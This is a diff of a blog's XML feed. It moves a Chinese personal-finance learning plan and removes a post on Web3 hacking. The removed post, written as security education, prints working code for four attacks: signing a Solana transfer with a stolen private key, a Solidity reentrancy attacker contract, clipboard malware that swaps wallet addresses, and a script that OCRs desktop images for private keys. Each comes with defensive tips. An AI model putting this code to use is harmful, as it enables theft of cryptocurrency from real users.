@@ -101,39 +101,6 @@
     
     
     <entry>
-      <title>炒股多年之后，把理财学成体系</title>
-      <link href="/blog/2026/10/26/learn-personal-finance/"/>
-      <url>/blog/2026/10/26/learn-personal-finance/</url>
-      
-        <content type="html"><![CDATA[<p>我炒股有些年头了，操作不缺，缺的是体系：账户是散点，没有一张网把它们连起来。这篇是月度轮换里「理财月」的课表——不面向纯新手，面向「有实战经验但没系统学过」的自己。先声明：这是学习笔记不是投资建议，文中不涉及个人资金情况。</p><a id="more"></a><h3 id="有经验者的常见病灶"><a href="#有经验者的常见病灶" class="headerlink" title="有经验者的常见病灶"></a>有经验者的常见病灶</h3><p>先自我诊断，有经验不等于没病，这几个病灶在老股民身上最常见：</p><ul><li><strong>从不计算真实收益率。</strong> 凭「感觉没亏」过日子，从不算 XIRR（资金加权年化收益），一算往往沉默——赚过的票记得牢，亏掉的自动淡忘。</li><li><strong>短线的肌肉记忆污染长线仓位。</strong> 会看 K 线不等于会做配置，两套逻辑混在一个账户里互相打架。</li><li><strong>只关心进攻，不关心地基。</strong> 应急金、保险这些「不性感」的部分长期空缺，一场意外就能被迫在底部割肉。</li><li><strong>收益归因靠讲故事。</strong> 「那波是我看得准」，到底归因于运气还是能力，从没拆过。</li></ul><p>这个月的课表就是照着病灶开的药。</p><h3 id="第-1-轮：主攻月四周课表（约-12-小时）"><a href="#第-1-轮：主攻月四周课表（约-12-小时）" class="headerlink" title="第 1 轮：主攻月四周课表（约 12 小时）"></a>第 1 轮：主攻月四周课表（约 12 小时）</h3><p><strong>第 1 周：财务体检 + 安全垫（约 3 小时）</strong></p><p>做两张表：资产负债表（我有什么、欠什么）和收支表（钱从哪来到哪去）。然后补两块地基：应急金 = 3–6 个月的家庭支出，放货基或存款，雷打不动；保险按「四件套」的逻辑自查一遍——医疗、重疾、意外、定期寿险（家庭经济支柱优先），原则是先保额后保费、消费型优先。有人给你推销返还型、终身寿的时候，记住渠道利益和你的利益不是一回事。投资体系的地基不是收益率，是「任何意外都不能让我被迫卖出」。</p><p><strong>第 2 周：现金流分账户（约 3 小时）</strong></p><p>用一个月时间追踪支出（记账 app 或表格），把收入切成三个账户：生活、应急、投资，发薪日先转投资那份（先支付给未来的自己）。算出月度可投资额——这是后面一切定投的额度依据。同时，把炒股这些年所有出入金流水导出来，用 Excel 的 XIRR 函数算一次真实年化。这个数字是整个体系的起点：不好看才有改的动力，好看更要防止它靠的是单一年份的行情。</p><p><strong>第 3 周：框架补课（约 3 小时）</strong></p><p>读两本书：《金钱心理学》（讲人性与行为偏差，薄，一次能读完）和《漫步华尔街》（讲市场难以战胜的证据与指数化逻辑）。带着炒股经验去读，每读到一个偏差（追涨杀跌、处置效应、过度自信）就在心里对号入座一次。这个月不求读完多少本，求把「为什么大部分主动操作跑不赢」这件事真正想通——想不通的人永远会把股票仓位越做越满。</p><p><strong>第 4 周：搭配置骨架（约 3 小时）</strong></p><p>用核心—卫星框架把账户重排：<strong>核心仓</strong>是宽基指数（沪深 300 / 中证 500 / 标普 500 / 纳指这类，场内 ETF 优先，费率低、透明），<strong>卫星仓</strong>留给行业和个股——给炒股爱好留个位置，但设上限（比如不超过总仓位的两三成），上限写死。股债金现的比例跟自己的回撤承受力挂钩：先想清楚「跌两成我睡得着吗」，再定比例。最后写出第一版 IPS（投资政策声明）：目标、期限、比例、再平衡规则、禁止事项，一页纸。以后所有冲动操作前先看这一页。</p><h3 id="第-2-轮：四个月后再轮到时"><a href="#第-2-轮：四个月后再轮到时" class="headerlink" title="第 2 轮：四个月后再轮到时"></a>第 2 轮：四个月后再轮到时</h3><ul><li><strong>估值与再平衡周</strong>：学看指数估值分位数（PE/PB 的历史百分位，工具看一眼就行——它不用于预测，只用于执行纪律）；做第一次季度再平衡，体会「卖涨买跌」反人性在哪。</li><li><strong>个股纪律周</strong>：把炒股经验改造成规则清单——买什么（能力圈：只碰看得懂生意）、买多少（单票上限、分批建仓）、何时卖（基本面破坏 / 到目标位 / 报表变脸，三者之外不卖）。每笔交易写「买入理由」，卖出时对照打分，打分长期不及格的模式就停用。</li><li><strong>复盘周</strong>：定一个复盘模板——本月收益归因（配置/选股/择时各贡献多少）、XIRR 与最大回撤更新、下月纪律修正。复盘的本质是防止经验变成路径依赖。</li><li><strong>长期周</strong>：补税务视角（基金持有期与赎回费、分红方式、个人养老金账户的抵税逻辑与流动性代价），然后给十年后的自己写一封「投资哲学」信：我相信什么、我不做什么。</li></ul><h3 id="第-3-轮及以后"><a href="#第-3-轮及以后" class="headerlink" title="第 3 轮及以后"></a>第 3 轮及以后</h3><p>债券与「固收+」的底层（久期、信用利差）、海外资产的配置方式、读书加深（《聪明的投资者》逐章精读、《穷查理宝典》、邱国鹭《投资中最简单的事》）。工具上有知有行的课程体系适合补底层，雪球上 E 大的长赢计划这类公开实盘适合「学思路不抄作业」地观察。</p><h3 id="常见的坑"><a href="#常见的坑" class="headerlink" title="常见的坑"></a>常见的坑</h3><p>用短线的仓位习惯管长线（两套逻辑必须分账户）、保险被推销带偏、All in 单一资产（包括「我看得懂的」）、把再平衡做成高频高抛低吸（再平衡是纪律不是策略）、以及最隐蔽的——把牛市赚的钱当成自己的能力。</p><hr><p>本文是「一年四件事」系列第 2 篇。总览与月度轮换课表：<a href="https://lucifer.ren/blog/2026/10/26/life-rotation-plan/">一年四件事：我的月度轮换计划（总览）</a></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 生活 </category>
-          
-          <category> 自我提升 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 投资 </tag>
-            
-            <tag> 理财 </tag>
-            
-            <tag> 学习路线 </tag>
-            
-            <tag> 资产配置 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>摄影与 vlog 自学路线：从手机开始</title>
       <link href="/blog/2026/10/26/learn-photography-vlog/"/>
       <url>/blog/2026/10/26/learn-photography-vlog/</url>
@@ -159,6 +126,39 @@
             <tag> vlog </tag>
             
             <tag> 手机摄影 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>炒股多年之后，把理财学成体系</title>
+      <link href="/blog/2026/10/26/learn-personal-finance/"/>
+      <url>/blog/2026/10/26/learn-personal-finance/</url>
+      
+        <content type="html"><![CDATA[<p>我炒股有些年头了，操作不缺，缺的是体系：账户是散点，没有一张网把它们连起来。这篇是月度轮换里「理财月」的课表——不面向纯新手，面向「有实战经验但没系统学过」的自己。先声明：这是学习笔记不是投资建议，文中不涉及个人资金情况。</p><a id="more"></a><h3 id="有经验者的常见病灶"><a href="#有经验者的常见病灶" class="headerlink" title="有经验者的常见病灶"></a>有经验者的常见病灶</h3><p>先自我诊断，有经验不等于没病，这几个病灶在老股民身上最常见：</p><ul><li><strong>从不计算真实收益率。</strong> 凭「感觉没亏」过日子，从不算 XIRR（资金加权年化收益），一算往往沉默——赚过的票记得牢，亏掉的自动淡忘。</li><li><strong>短线的肌肉记忆污染长线仓位。</strong> 会看 K 线不等于会做配置，两套逻辑混在一个账户里互相打架。</li><li><strong>只关心进攻，不关心地基。</strong> 应急金、保险这些「不性感」的部分长期空缺，一场意外就能被迫在底部割肉。</li><li><strong>收益归因靠讲故事。</strong> 「那波是我看得准」，到底归因于运气还是能力，从没拆过。</li></ul><p>这个月的课表就是照着病灶开的药。</p><h3 id="第-1-轮：主攻月四周课表（约-12-小时）"><a href="#第-1-轮：主攻月四周课表（约-12-小时）" class="headerlink" title="第 1 轮：主攻月四周课表（约 12 小时）"></a>第 1 轮：主攻月四周课表（约 12 小时）</h3><p><strong>第 1 周：财务体检 + 安全垫（约 3 小时）</strong></p><p>做两张表：资产负债表（我有什么、欠什么）和收支表（钱从哪来到哪去）。然后补两块地基：应急金 = 3–6 个月的家庭支出，放货基或存款，雷打不动；保险按「四件套」的逻辑自查一遍——医疗、重疾、意外、定期寿险（家庭经济支柱优先），原则是先保额后保费、消费型优先。有人给你推销返还型、终身寿的时候，记住渠道利益和你的利益不是一回事。投资体系的地基不是收益率，是「任何意外都不能让我被迫卖出」。</p><p><strong>第 2 周：现金流分账户（约 3 小时）</strong></p><p>用一个月时间追踪支出（记账 app 或表格），把收入切成三个账户：生活、应急、投资，发薪日先转投资那份（先支付给未来的自己）。算出月度可投资额——这是后面一切定投的额度依据。同时，把炒股这些年所有出入金流水导出来，用 Excel 的 XIRR 函数算一次真实年化。这个数字是整个体系的起点：不好看才有改的动力，好看更要防止它靠的是单一年份的行情。</p><p><strong>第 3 周：框架补课（约 3 小时）</strong></p><p>读两本书：《金钱心理学》（讲人性与行为偏差，薄，一次能读完）和《漫步华尔街》（讲市场难以战胜的证据与指数化逻辑）。带着炒股经验去读，每读到一个偏差（追涨杀跌、处置效应、过度自信）就在心里对号入座一次。这个月不求读完多少本，求把「为什么大部分主动操作跑不赢」这件事真正想通——想不通的人永远会把股票仓位越做越满。</p><p><strong>第 4 周：搭配置骨架（约 3 小时）</strong></p><p>用核心—卫星框架把账户重排：<strong>核心仓</strong>是宽基指数（沪深 300 / 中证 500 / 标普 500 / 纳指这类，场内 ETF 优先，费率低、透明），<strong>卫星仓</strong>留给行业和个股——给炒股爱好留个位置，但设上限（比如不超过总仓位的两三成），上限写死。股债金现的比例跟自己的回撤承受力挂钩：先想清楚「跌两成我睡得着吗」，再定比例。最后写出第一版 IPS（投资政策声明）：目标、期限、比例、再平衡规则、禁止事项，一页纸。以后所有冲动操作前先看这一页。</p><h3 id="第-2-轮：四个月后再轮到时"><a href="#第-2-轮：四个月后再轮到时" class="headerlink" title="第 2 轮：四个月后再轮到时"></a>第 2 轮：四个月后再轮到时</h3><ul><li><strong>估值与再平衡周</strong>：学看指数估值分位数（PE/PB 的历史百分位，工具看一眼就行——它不用于预测，只用于执行纪律）；做第一次季度再平衡，体会「卖涨买跌」反人性在哪。</li><li><strong>个股纪律周</strong>：把炒股经验改造成规则清单——买什么（能力圈：只碰看得懂生意）、买多少（单票上限、分批建仓）、何时卖（基本面破坏 / 到目标位 / 报表变脸，三者之外不卖）。每笔交易写「买入理由」，卖出时对照打分，打分长期不及格的模式就停用。</li><li><strong>复盘周</strong>：定一个复盘模板——本月收益归因（配置/选股/择时各贡献多少）、XIRR 与最大回撤更新、下月纪律修正。复盘的本质是防止经验变成路径依赖。</li><li><strong>长期周</strong>：补税务视角（基金持有期与赎回费、分红方式、个人养老金账户的抵税逻辑与流动性代价），然后给十年后的自己写一封「投资哲学」信：我相信什么、我不做什么。</li></ul><h3 id="第-3-轮及以后"><a href="#第-3-轮及以后" class="headerlink" title="第 3 轮及以后"></a>第 3 轮及以后</h3><p>债券与「固收+」的底层（久期、信用利差）、海外资产的配置方式、读书加深（《聪明的投资者》逐章精读、《穷查理宝典》、邱国鹭《投资中最简单的事》）。工具上有知有行的课程体系适合补底层，雪球上 E 大的长赢计划这类公开实盘适合「学思路不抄作业」地观察。</p><h3 id="常见的坑"><a href="#常见的坑" class="headerlink" title="常见的坑"></a>常见的坑</h3><p>用短线的仓位习惯管长线（两套逻辑必须分账户）、保险被推销带偏、All in 单一资产（包括「我看得懂的」）、把再平衡做成高频高抛低吸（再平衡是纪律不是策略）、以及最隐蔽的——把牛市赚的钱当成自己的能力。</p><hr><p>本文是「一年四件事」系列第 2 篇。总览与月度轮换课表：<a href="https://lucifer.ren/blog/2026/10/26/life-rotation-plan/">一年四件事：我的月度轮换计划（总览）</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 生活 </category>
+          
+          <category> 自我提升 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 投资 </tag>
+            
+            <tag> 理财 </tag>
+            
+            <tag> 学习路线 </tag>
+            
+            <tag> 资产配置 </tag>
             
         </tags>
       
@@ -1529,35 +1529,6 @@
     
     
     <entry>
-      <title>我是一个区块链黑客（第一篇）</title>
-      <link href="/blog/2025/03/01/web3-hacker-1/"/>
-      <url>/blog/2025/03/01/web3-hacker-1/</url>
-      
-        <content type="html"><![CDATA[<p>近期 Bybit的多签冷钱包被黑，损失约14.6亿美元，导致用户资产被盗，这事闹得沸沸扬扬，这次的事件给 web3 社区带来了很多的思考。经调查，Safe 官方声明指出，北韩骇客组织 Lazarus Group 透过入侵一名 Safe 开发者的设备，将恶意程式码注入前端网站「app.safe.global」，成功绕过多重签名验证，并伪装成正常交易提交批准。Verichains 调查报告显示，该恶意程式码具有针对性，只有在特定条件下 (如操作 Bybit 帐户时) 才会触发，以避免影响普通用户，达到掩人耳目的效果。Safe 团队强调，经外部安全研究人员一致确认，<strong>Safe 的智能合约本身并无漏洞，问题完全出在开发者设备遭入侵。</strong></p><p>这事情挺离谱的，为啥一个开发者就可以不经过 review 直接将明显有问题的代码发布到线上，多签具体是如何绕过的等等。退一步来说，我们就算姑且认可这个结论。但是本次攻击暴露了多签钱包的技术性弱点、以及供应链攻击的致命风险，更让 Safe 作为业界主流安全解决方案的可靠性遭受质疑。此事件揭示了供应链攻击对加密货币生态的威胁，即便智能合约安全，前端与批准环节仍是弱点（这我在之前的区块链钱包中有提到过）。</p><p>今天我们就来聊一聊 web3 黑客攻击的一些常见手段。我会以教育和安全意识提升为目的，从理论和技术的角度探讨区块链黑客可能用来窃取用户资产的常见方法，并提供相应的代码示例。这些方法基于公开已知的攻击方式，主要用于展示漏洞如何被利用，以及如何防范。我不会提供任何实际可直接用于非法行为的代码，而是专注于技术原理的讲解。</p><a id="more"></a><p>在区块链世界中，窃取用户资产的常见手法包括私钥泄露、钓鱼攻击、智能合约漏洞利用和交易篡改等。以下我将以“获取用户私钥”和“利用智能合约漏洞”为例，结合伪代码或简化代码进行说明。</p><h3 id="方法-1：通过钓鱼攻击获取私钥"><a href="#方法-1：通过钓鱼攻击获取私钥" class="headerlink" title="方法 1：通过钓鱼攻击获取私钥"></a>方法 1：通过钓鱼攻击获取私钥</h3><p><strong>原理</strong>：黑客通过伪造网站、恶意软件或社交工程，诱导用户泄露私钥或助记词。一旦获取私钥，黑客可以完全控制用户的钱包并转移资产。</p><p><strong>攻击步骤</strong>：</p><ol><li>创建一个伪装成合法钱包或交易所的钓鱼网站。</li><li>诱导用户输入私钥或助记词（如假装“验证身份”）。</li><li>使用窃取的私钥签名交易，转移资产。</li></ol><p><strong>伪代码示例（基于 Solana）</strong>：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; Keypair, Transaction, SystemProgram, Connection &#125; = <span class="built_in">require</span>(<span class="string">"@solana/web3.js"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设黑客已通过钓鱼网站获取用户私钥</span></span><br><span class="line"><span class="keyword">const</span> stolenPrivateKey = <span class="built_in">Uint8Array</span>.from([<span class="comment">/* 用户私钥字节数组 */</span>]);</span><br><span class="line"><span class="keyword">const</span> hackerWallet = Keypair.fromSecretKey(stolenPrivateKey);</span><br><span class="line"><span class="keyword">const</span> victimPubkey = hackerWallet.publicKey;</span><br><span class="line"><span class="keyword">const</span> hackerPubkey = Keypair.generate().publicKey; <span class="comment">// 黑客自己的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接 Solana 网络</span></span><br><span class="line"><span class="keyword">const</span> connection = <span class="keyword">new</span> Connection(<span class="string">"https://api.mainnet-beta.solana.com"</span>, <span class="string">"confirmed"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">stealAssets</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 创建转账交易</span></span><br><span class="line">  <span class="keyword">const</span> transaction = <span class="keyword">new</span> Transaction().add(</span><br><span class="line">    SystemProgram.transfer(&#123;</span><br><span class="line">      fromPubkey: victimPubkey,</span><br><span class="line">      toPubkey: hackerPubkey,</span><br><span class="line">      lamports: <span class="number">1000000000</span>, <span class="comment">// 转移 1 SOL</span></span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用窃取的私钥签名交易</span></span><br><span class="line">  <span class="keyword">const</span> signature = <span class="keyword">await</span> connection.sendTransaction(transaction, [hackerWallet]);</span><br><span class="line">  <span class="keyword">await</span> connection.confirmTransaction(signature);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"资产已转移，交易签名:"</span>, signature);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stealAssets().catch(<span class="built_in">console</span>.error);</span><br></pre></td></tr></table></figure></p><p><strong>如何防范</strong>：</p><ul><li>用户应使用硬件钱包（如 Ledger）存储私钥，避免在线输入。</li><li>检查网站 URL 和 SSL 证书，避免访问钓鱼网站。</li><li>使用多重签名钱包，增加资产转移的难度。</li></ul><h3 id="方法-2：利用智能合约漏洞（重入攻击）"><a href="#方法-2：利用智能合约漏洞（重入攻击）" class="headerlink" title="方法 2：利用智能合约漏洞（重入攻击）"></a>方法 2：利用智能合约漏洞（重入攻击）</h3><p><strong>原理</strong>：智能合约可能存在逻辑漏洞，如“重入攻击”（Reentrancy Attack），黑客通过反复调用合约中的函数，在资产提取完成前多次提取资金。常见于以太坊的 Solidity 合约。</p><p><strong>攻击步骤</strong>：</p><ol><li>找到一个未正确实现状态更新的提款合约。</li><li>部署一个恶意合约，反复调用目标合约的提款函数。</li><li>在目标合约更新余额前窃取更多资产。</li></ol><p><strong>代码示例（Solidity）</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// 目标合约（有漏洞）</span><br><span class="line">contract VulnerableBank &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amount = balances[msg.sender];</span><br><span class="line">        require(amount &gt; 0, &quot;No funds to withdraw&quot;);</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;); // 外部调用，未更新状态</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender] = 0; // 更新状态滞后</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 恶意合约（攻击者部署）</span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    VulnerableBank public bank;</span><br><span class="line">    uint public attackCount = 0;</span><br><span class="line">    uint constant MAX_ATTEMPTS = 5;</span><br><span class="line"></span><br><span class="line">    constructor(address _bankAddress) &#123;</span><br><span class="line">        bank = VulnerableBank(_bankAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 存款以准备攻击</span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        bank.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 触发重入攻击</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        bank.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 接收资金时反复调用目标合约</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (attackCount &lt; MAX_ATTEMPTS &amp;&amp; address(bank).balance &gt; 0) &#123;</span><br><span class="line">            attackCount++;</span><br><span class="line">            bank.withdraw(); // 重入调用</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>攻击过程</strong>：</p><ol><li>黑客部署 <code>Attacker</code> 合约并向 <code>VulnerableBank</code> 存入少量 ETH。</li><li>调用 <code>attack()</code> 函数，触发 <code>withdraw()</code>。</li><li>在 <code>VulnerableBank</code> 转账给 <code>Attacker</code> 时，<code>receive()</code> 函数被调用，重复执行 <code>withdraw()</code>，直到耗尽合约资金。</li></ol><p><strong>如何防范</strong>：</p><ul><li>在智能合约中，使用“检查-效果-交互”模式（Checks-Effects-Interactions），即先更新状态再执行外部调用。</li><li>使用非重入修饰符（如 OpenZeppelin 的 <code>nonReentrant</code>）。</li><li>定期审计合约代码，避免逻辑漏洞。</li></ul><h3 id="方法-3：交易篡改（中间人攻击）"><a href="#方法-3：交易篡改（中间人攻击）" class="headerlink" title="方法 3：交易篡改（中间人攻击）"></a>方法 3：交易篡改（中间人攻击）</h3><p><strong>原理</strong>：黑客通过恶意软件（如剪贴板劫持）篡改用户复制的接收地址，将资金转到黑客控制的地址。</p><p><strong>伪代码示例</strong>：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 恶意软件伪代码（运行在用户设备上）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">monitorClipboard</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> originalAddress = navigator.clipboard.readText();</span><br><span class="line">  <span class="keyword">if</span> (isValidSolanaAddress(originalAddress)) &#123;</span><br><span class="line">    <span class="keyword">const</span> hackerAddress = <span class="string">"HACKER_ADDRESS_HERE"</span>;</span><br><span class="line">    navigator.clipboard.writeText(hackerAddress);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`地址已替换: <span class="subst">$&#123;originalAddress&#125;</span> -&gt; <span class="subst">$&#123;hackerAddress&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测 Solana 地址的简单校验</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidSolanaAddress</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> address.length === <span class="number">44</span> &amp;&amp; <span class="regexp">/^[A-Za-z0-9]+$/</span>.test(address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 持续监控剪贴板</span></span><br><span class="line">setInterval(monitorClipboard, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure></p><p><strong>如何防范</strong>：</p><ul><li>使用防病毒软件检测恶意程序。</li><li>手动验证交易地址，而不是依赖复制粘贴。</li><li>在发送交易前，使用钱包的地址校验功能。</li></ul><p>除了监控剪贴板，最近我还发现一些恶意钱包会读取用户本地的图片，读取这些图片，利用光学字符识别（OCR）技术提取私钥信息，进而控制用户钱包并转移资产。</p><p>接下来，我们通过代码来讲解。</p><p>第一步：扫描本地图片</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_images</span><span class="params">(directory)</span>:</span></span><br><span class="line">    image_files = []</span><br><span class="line">    <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> file.endswith((<span class="string">".png"</span>, <span class="string">".jpg"</span>, <span class="string">".jpeg"</span>)):</span><br><span class="line">                image_files.append(os.path.join(root, file))</span><br><span class="line">    <span class="keyword">return</span> image_files</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例：扫描桌面</span></span><br><span class="line">desktop_path = os.path.expanduser(<span class="string">"~/Desktop"</span>)</span><br><span class="line">images = scan_images(desktop_path)</span><br><span class="line">print(<span class="string">"找到的图片文件:"</span>, images)</span><br></pre></td></tr></table></figure><p>第二步：提取私钥信息</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_text_from_image</span><span class="params">(image_path)</span>:</span></span><br><span class="line">    img = Image.open(image_path)</span><br><span class="line">    text = pytesseract.image_to_string(img)</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_private_key</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="comment"># 假设 Solana 私钥是 44 字符的 Base58 字符串</span></span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line">    pattern = <span class="string">r"[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]&#123;44&#125;"</span></span><br><span class="line">    match = re.search(pattern, text)</span><br><span class="line">    <span class="keyword">return</span> match.group(<span class="number">0</span>) <span class="keyword">if</span> match <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例：处理找到的图片</span></span><br><span class="line"><span class="keyword">for</span> image <span class="keyword">in</span> images:</span><br><span class="line">    text = extract_text_from_image(image)</span><br><span class="line">    private_key = find_private_key(text)</span><br><span class="line">    <span class="keyword">if</span> private_key:</span><br><span class="line">        print(<span class="string">"找到私钥:"</span>, private_key)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>第三步：转移资产</p><p>这个前面已经讲过了，这里不再赘述。</p><p><strong>如何防范</strong>：</p><ul><li>避免将私钥或助记词截图保存，优先使用硬件钱包（如 Ledger、Trezor）。</li><li>如果必须保存私钥，使用加密工具（如 VeraCrypt）存储文件。</li><li>安装防病毒软件，定期扫描设备。</li><li>避免下载不明来源的文件或点击可疑链接。</li><li>谨慎使用钱包软件，不要安装来源不明的软件。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上方法展示了黑客可能利用的技术手段，但这些知识应仅用于学习和防御目的。区块链的安全性依赖于用户的警惕性和开发者的严谨性。作为一名“虚拟黑客”，我强调：任何非法窃取资产的行为都是不道德且违法的。真正的技术爱好者应致力于构建更安全的区块链生态，而不是破坏它。</p><p>如果你是开发者或用户，可以通过以下措施提高安全性：</p><ul><li><strong>用户</strong>：使用冷钱包、避免泄露私钥、验证交易细节。</li><li><strong>开发者</strong>：审计代码、使用成熟库（如 OpenZeppelin）、实施多重签名。</li></ul><p>有其他具体问题吗？我可以进一步深入某个攻击或防御策略！</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 区块链 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 区块链 </tag>
-            
-            <tag> web3 </tag>
-            
-            <tag> 黑客 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>从零实现区块链 - 侧链与L2</title>
       <link href="/blog/2025/03/01/web3-l2-from-zero/"/>
       <url>/blog/2025/03/01/web3-l2-from-zero/</url>
@@ -1581,6 +1552,35 @@
             <tag> 侧链 </tag>
             
             <tag> L2 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>我是一个区块链黑客（第一篇）</title>
+      <link href="/blog/2025/03/01/web3-hacker-1/"/>
+      <url>/blog/2025/03/01/web3-hacker-1/</url>
+      
